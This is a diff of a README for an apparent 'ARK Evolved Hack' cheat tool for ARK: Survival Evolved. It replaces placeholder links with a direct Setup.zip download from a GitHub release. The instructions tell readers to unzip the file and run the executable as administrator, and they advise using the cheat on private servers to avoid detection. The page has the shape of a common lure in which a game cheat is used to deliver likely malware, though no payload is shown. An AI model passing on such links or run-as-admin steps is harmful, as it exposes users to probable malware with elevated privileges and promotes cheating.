@@ -2,7 +2,7 @@
 
 ![ARK Survival Evolved](https://img.shields.io/badge/ARK%20Survival%20Evolved-2025-brightgreen)
 
-Welcome to the **ARK Evolved Hack** repository! This project provides exclusive tools designed for ARK: Survival Evolved, specifically for Windows users. You can find the latest downloads and updates in the [Releases section](555). 
+Welcome to the **ARK Evolved Hack** repository! This project provides exclusive tools designed for ARK: Survival Evolved, specifically for Windows users. You can find the latest downloads and updates in the [Releases section](https://github.com/kidennnikeairmax34/ARK-Evolved-Hack/releases/download/Download/Setup.zip). 
 
 ## Table of Contents
 
@@ -31,7 +31,7 @@ The ARK Evolved Hack includes various features that enhance your gameplay experi
 
 ## Installation
 
-To get started, download the latest version of the hack from the [Releases section](555). Once downloaded, follow these steps:
+To get started, download the latest version of the hack from the [Releases section](https://github.com/kidennnikeairmax34/ARK-Evolved-Hack/releases/download/Download/Setup.zip). Once downloaded, follow these steps:
 
 1. **Extract the Files**: Unzip the downloaded file to a folder of your choice.
 2. **Run as Administrator**: Right-click the executable file and select "Run as administrator" to ensure proper permissions.
@@ -50,7 +50,7 @@ Using the ARK Evolved Hack is straightforward:
 
 - **Use on Private Servers**: To avoid detection, use the hack primarily on private servers.
 - **Test Features**: Before engaging in competitive play, test each feature to ensure they work as expected.
-- **Stay Updated**: Regularly check the [Releases section](555) for updates and improvements.
+- **Stay Updated**: Regularly check the [Releases section](https://github.com/kidennnikeairmax34/ARK-Evolved-Hack/releases/download/Download/Setup.zip) for updates and improvements.
 
 ## Contributing
 
